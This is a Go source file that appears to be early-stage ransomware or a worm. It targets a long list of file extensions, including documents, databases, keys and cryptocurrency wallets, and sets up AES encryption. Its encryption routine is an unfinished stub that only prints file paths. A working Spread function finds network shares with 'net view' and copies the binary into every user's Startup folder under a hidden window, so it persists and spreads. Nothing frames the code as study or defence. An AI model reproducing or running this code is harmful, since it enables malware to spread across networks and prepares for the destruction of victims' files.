package main
import (
	"os/exec"
	"syscall"
	"fmt"
	"regexp"
	"os"
	"sync"
	"crypto/aes"
	"crypto/cipher"
	"path/filepath"
	"strings"
)

var exts []string = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11" , ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat"}
var badfolders []string = []string{"tmp", "winnt", "Application Data", "AppData", "Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin", "System Volume Information", "Boot", "Windows"}

var block cipher.Block
var iv [aes.BlockSize]byte
var stream cipher.Stream
var SharedPCs []string

func main() {
	var wg sync.WaitGroup
	Run("msg * Infected")
	Spread()
	wg.Wait()
}

func Spread() {
	netPcs := Run("net view")
	//Parse
	re := regexp.MustCompile(`\\\\.*\b`)
    for _, match := range re.FindAllString(netPcs, -1) {
    	SharedPCs = append(SharedPCs, match)
    }
    //For PC in SharedPCs, get users
    for _, SharedPC := range SharedPCs {
    	out := Run("dir /B /A " + SharedPC + "\\Users")
    	users := strings.Split(out, "\r\n")
    	//Copy to run
    	for _, user := range users {
    		Run("copy "+os.Args[0]+" /Y /Z /V " + SharedPC + "\\Users\\" + user +"\\Appdata\\Roaming\\Microsoft\\Windows\\" + `"Start Menu"` + "\\Programs\\Startup")
    	}
    } 
}


func Run(cmd string) string {
	e := exec.Command("cmd", "/C", cmd)
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	res, err := e.Output()
	e.Run()
	
	if err != nil {
		return string(err.Error())
	}
	return string(res)
}

func EncryptDocumets(path string, mode bool) {
	filepath.Walk(path, VisitD)	
}

func VisitD(path string, f os.FileInfo, err error) error {
	fmt.Println(path)
	return nil
}